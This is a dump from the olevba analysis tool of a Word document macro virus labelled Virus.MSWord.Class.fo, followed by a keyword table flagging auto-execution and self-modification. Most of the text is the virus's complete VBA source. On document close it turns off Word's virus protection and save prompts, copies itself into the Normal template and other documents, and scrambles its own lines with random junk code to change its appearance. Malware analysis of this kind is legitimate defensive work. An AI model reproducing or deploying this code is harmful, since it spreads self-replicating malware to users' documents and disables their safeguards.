olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Class.fo
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Class.fo - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub Document_Close()
C = LnGGi + AjRPz + JhRIe + TyUIo + QyNKt + NlFGh + SnVUv + PeFLx + VlAMx + R
On Error Resume Next
K = BtIGf + VrGDw + OqJPs + NvEMy + T
Options.SaveNormalPrompt = 0
H = RrGUm + NqCMk + UhALf + JlLLp + I
IF44 = NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
Q = BuVBr + IpDKu + NoDUl + LrCRp + N
Options.ConfirmConversions = 0
E = AvBCs + CzLOo + SyEOq + HwPUo + BjIKp + EsCMw + UxJGg + QtOFy + AsRGu + KuHAp + T
Application.EnableCancelKey = 0
R = QfHLy + NqVCf + NsDKv + VxAHn + UoISh + OkVHp + JkDJo + L
Options.VirusProtection = 0
C = LuNKl + TrGGw + LvMHg + KvPQm + RwREe + ByRIp + C
CV86 = ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
J = BkLMv + KjQIg + QyNPz + I
If CV86 > 0 And IF44 > 0 Then GoTo RU83
E = ViPJj + GsJUx + OsCEy + JeLKe + I
If CV86 = 0 Then
O = GoDLe + MfOJk + BjPKw + EsRBo + QiHVi + T
Set BI83 = ActiveDocument.VBProject.VBComponents.Item(1)
P = JxURk + IzDDo + IxGOh + KvTIs + QvJFg + NrISn + UoHTu + FwHAj + StPIi + QqBJs + G
PK13 = True
E = DmVFf + CeNNg + MuSBq + QuIIo + FnEBg + ClTFf + SqKQh + IvHJw + NxEPo + V
End If
M = AqGQg + SwCAw + IvVTn + QwFAh + RiHJn + RnEEr + H
If IF44 = 0 Then
O = JnBMv + VfVSq + ReFDk + AsPCx + GrMGt + RtIIh + JkOIf + L
Set BI83 = NormalTemplate.VBProject.VBComponents.Item(1)
L = MjKTt + OgGIz + GeQMm + FoRSx + J
NL71 = True
E = JkKIf + VmLNy + G
End If
L = DqMMi + ArBGm + N
If NL71 <> True And PK13 <> True Then GoTo RU83
U = UjMJj + DyFQf + HkRAi + KvNTf + OzOVz + B
If NL71 = True Then BI83.CodeModule.AddFromString ("Sub AutoClose()" & vbCr & ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(2, CV86 - 1))
P = MiABn + GqLQq + HyIMj + MlRJi + P
If PK13 = True Then BI83.CodeModule.AddFromString ("Sub Document_Close()" & vbCr & NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.Lines(2, IF44 - 1))
C = EiBFf + SvEFf + FuPOi + QtSPg + EsMHv + MmDBm + SlJEp + VjIKn + OzOTs + J
With BI83.CodeModule
G = HqQJk + LwGBe + GmGSs + RwGBp + JmAHx + HjNVh + MmETs + NmQPk + QuMLn + J
For x = 2 To (BI83.CodeModule.CountOfLines - 1) Step 2
S = VoMKz + IwODv + IxNPq + JsPEz + TzKQj + E
For y = 1 To (Int(Rnd * 10) + 2)
A = ThJKs + FiLLm + BkFBt + VsOHr + HvEJm + FkMNy + D
HP61 = HP61 + (Chr(65 + Int(Rnd * 22))) & (Chr(122 - Int(Rnd * 22))) & (Chr(65 + Int(Rnd * 22))) & (Chr(65 + Int(Rnd * 22))) & (Chr(122 - Int(Rnd * 22))) & " + "
S = InGSg + LrAFw + OeGFg + CnNNk + C
Next y
I = SuOIh + JhEQg + EeVTo + OpDOm + SrBLy + J
.replaceline x, (Chr(65 + Int(Rnd * 22))) & " = " & HP61 & (Chr(65 + Int(Rnd * 22)))
U = VzONo + AkGVt + IsHFm + PuMMe + F
HP61 = ""
D = QrNKp + CeDMl + ClQRq + BpMBq + CwGVm + GqKBp + JfGDo + HoIFy + OrMTq + NrBCw + Q
Next x
M = DzPSo + ReLBm + HtPIr + EgDIm + Q
End With
T = HzRUt + EfEJs + HeMLx + A
RU83:
Q = PuUKk + IuNMp + OjBDx + BnVEs + TpFSy + CeSSe + FlNVq + BgDFm + IoUMe + I
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
+----------+--------------------+---------------------------------------------+

